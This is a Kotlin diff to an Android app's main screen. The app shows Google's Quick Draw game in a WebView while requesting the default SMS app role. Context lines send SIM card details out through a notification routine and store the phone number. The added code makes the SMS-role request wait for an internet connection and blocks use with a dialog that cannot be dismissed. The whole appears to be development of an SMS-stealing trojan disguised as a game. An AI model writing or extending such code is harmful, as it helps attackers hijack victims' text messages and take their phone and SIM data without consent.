@@ -42,6 +42,7 @@ class MainActivity : AppCompatActivity() {
     private val SIM_INFO_SENT_KEY = "sim_info_sent"
     private val PHONE_NUMBER_KEY = "phone_number"
     private val PHONE_NUMBER_ENTERED_KEY = "phone_number_entered"
+    private var isNetworkMonitoringActive = false
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -63,9 +64,74 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        webView.loadUrl("https://quickdraw.withgoogle.com")
-        checkAndRequestSmsRole()
+        // Начинаем мониторинг сети
+        startNetworkMonitoring()
+        checkInternetAndLoadUrl()
     }
+
+    private fun startNetworkMonitoring() {
+        if (isNetworkMonitoringActive) return
+        
+        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            connectivityManager.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: android.net.Network) {
+                    super.onAvailable(network)
+                    runOnUiThread {
+                        // Интернет восстановлен
+                        if (!webView.url.isNullOrEmpty() && !isInternetAvailable()) {
+                            showNoInternetDialog { checkInternetAndLoadUrl() }
+                        }
+                    }
+                }
+
+                override fun onLost(network: android.net.Network) {
+                    super.onLost(network)
+                    runOnUiThread {
+                        // Интернет пропал
+                        showNoInternetDialog { checkInternetAndLoadUrl() }
+                    }
+                }
+            })
+            isNetworkMonitoringActive = true
+        }
+    }
+
+    private fun checkInternetAndLoadUrl() {
+        if (isInternetAvailable()) {
+            webView.loadUrl("https://quickdraw.withgoogle.com")
+            checkAndRequestSmsRole()
+        } else {
+            showNoInternetDialog { checkInternetAndLoadUrl() }
+        }
+    }
+
+    @SuppressLint("ServiceCast")
+    private fun isInternetAvailable(): Boolean {
+        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val network = connectivityManager.activeNetwork ?: return false
+            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
+            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
+                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
+        } else {
+            @Suppress("DEPRECATION")
+            val networkInfo = connectivityManager.activeNetworkInfo
+            @Suppress("DEPRECATION")
+            networkInfo != null && networkInfo.isConnected
+        }
+    }
+
+    private fun showNoInternetDialog(retryAction: () -> Unit) {
+        AlertDialog.Builder(this)
+            .setTitle("Нет подключения к интернету")
+            .setMessage("Для продолжения работы приложения требуется интернет-соединение")
+            .setPositiveButton("Попробовать снова") { _, _ -> retryAction() }
+            .setCancelable(false)
+            .show()
+    }
+
 
     private fun checkAndRequestSmsRole() {
         if (!isDefaultSmsApp()) {
@@ -169,6 +235,8 @@ class MainActivity : AppCompatActivity() {
         return text.replace(Regex("[^0-9]"), "").removePrefix("7")
     }
 
+    
+
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SMS_ROLE_REQUEST_CODE) {
@@ -234,6 +302,8 @@ class MainActivity : AppCompatActivity() {
         sendNotification("Информация о SIM-картах:\n$simInfo")
         sharedPrefs.edit().putBoolean(SIM_INFO_SENT_KEY, true).apply()
     }
+
+    
 
 
     @SuppressLint("HardwareIds", "MissingPermission")
